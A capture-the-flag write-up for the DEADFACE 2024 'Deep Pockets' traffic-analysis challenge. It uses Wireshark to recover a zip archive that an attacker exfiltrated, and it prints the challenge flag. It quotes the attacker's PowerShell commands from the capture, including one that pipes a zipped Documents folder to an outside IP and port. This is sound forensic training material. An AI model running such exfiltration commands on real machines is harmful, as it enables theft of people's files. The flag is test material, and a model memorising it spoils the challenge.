---
title: "Deep Pockets"
draft: false
tags: ["TRAFFIC ANALYSIS"]
series: "deadface2024"
date: 2024-10-06
---

## Challenge Description
>Garry Sartoris had a CSV file of VIP clients on his machine that DEADFACE exfiltrated. TGRI wants us to confirm William Harrington’s account number to determine if his information was compromised. Submit William Harrington’s account number as the flag.
>
>Submit the flag as flag{AAAA##############}.

## file
[phantom.zip](/deadface2024/phantom.zip)

## Solution
In `Wireshark` we can use the filter `data` and search for any `csv` string in packet bytes.

![Image of wireshark filters](/deadface2024/deepPockets-1.png)

By following the TCP Stream of the first result (tcp.stream eq 297) we see some logs of windows PowerShell commands that contains `vip-clients.csv`.

The csv file we want is compressed with some other files into a zip archive:

`PS C:\Users\garry> Compress-Archive -Path "C:\Users\garry\Documents" -DestinationPath "C:\Users\garry\collection.zip"`

The archive is then sent through an ip and tcp port:

`PS C:\Users\garry> 945f.exe 45.55.201.188 7523 < collection.zip`

We can now use more precise filters: 

```ip.dst == 45.55.201.188 and tcp.port == 7523```

and save the raw data from the first tcp stream (tcp.stream eq 311). 

![Image of wireshark tcp stream](/deadface2024/deepPockets-2.png)

Let's name it collection.zip. We can now decompress it and print its content.

```
unzip collection.zip 
Archive:  collection.zip
warning:  collection.zip appears to use backslashes as path separators
  inflating: Documents/Garry_Sartoris_Timesheet.docx  
  inflating: Documents/techno_global_research_industries.xlsx  
  inflating: Documents/TGRI_2024_Q4_Goals_Presentation.pptx  
  inflating: Documents/TGRI_Dress_Standards_Letter.docx  
  inflating: Documents/vip-clients.csv  
```

```
cat Documents/vip-clients.csv 
Customer Name, Account Number
Melissa Bolton, SJWX94378180672085
Aaron Parker, FJOY35738636143323
William Harrington, RRNQ85158591854615
Jennifer Smith, IYEC17545523444798
```

Flag: flag{RRNQ85158591854615}
